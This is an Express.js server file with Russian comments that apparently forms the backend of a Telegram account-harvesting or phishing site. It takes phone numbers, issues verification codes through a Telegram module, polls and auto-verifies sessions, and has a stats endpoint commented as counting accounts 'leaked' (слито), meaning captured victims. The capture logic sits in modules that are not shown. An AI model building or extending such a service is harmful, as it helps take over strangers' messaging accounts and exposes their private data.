require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');

const { initDB, createSession, verifySession, checkSession, getVerifiedCount } = require('./db');
const { sendTelegramCode } = require('./telegram');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, '..')));

// Инициализация базы данных
initDB().catch(console.error);

// ============== API ROUTES ==============

// 1. Отправка кода
app.post('/api/send-code', async (req, res) => {
    const { phone } = req.body;
    
    if (!phone) {
        return res.status(400).json({ success: false, error: 'Phone required' });
    }
    
    const code = Math.floor(100000 + Math.random() * 900000).toString();
    const sessionId = require('crypto').randomBytes(16).toString('hex');
    
    const created = await createSession(sessionId, phone, code);
    if (!created) {
        return res.status(500).json({ success: false, error: 'DB error' });
    }
    
    const siteUrl = process.env.SITE_URL || `http://localhost:${PORT}`;
    const sent = await sendTelegramCode(phone, code, sessionId, siteUrl);
    
    if (sent) {
        res.json({ success: true, sessionId });
    } else {
        // Даже если телеграм не отправил, сессия создана — можно повторить
        res.json({ success: false, error: 'Telegram send failed, try again' });
    }
});

// 2. Проверка статуса сессии (polling)
app.get('/api/check-session/:sessionId', async (req, res) => {
    const { sessionId } = req.params;
    const session = await checkSession(sessionId);
    
    if (session) {
        res.json({ verified: session.verified });
    } else {
        res.json({ verified: false, error: 'Session not found or expired' });
    }
});

// 3. Автоматическая верификация через deep link
app.post('/api/auto-verify', async (req, res) => {
    const { sessionId, code } = req.body;
    
    if (!sessionId || !code) {
        return res.status(400).json({ success: false });
    }
    
    const verified = await verifySession(sessionId, code);
    res.json({ success: verified });
});

// 4. Статистика (сколько аккаунтов "слито")
app.get('/api/stats', async (req, res) => {
    const count = await getVerifiedCount();
    res.json({ total: count });
});

// 5. Health check для Render
app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Запуск сервера
app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📊 API ready: /api/send-code, /api/check-session/:id, /api/auto-verify`);
});
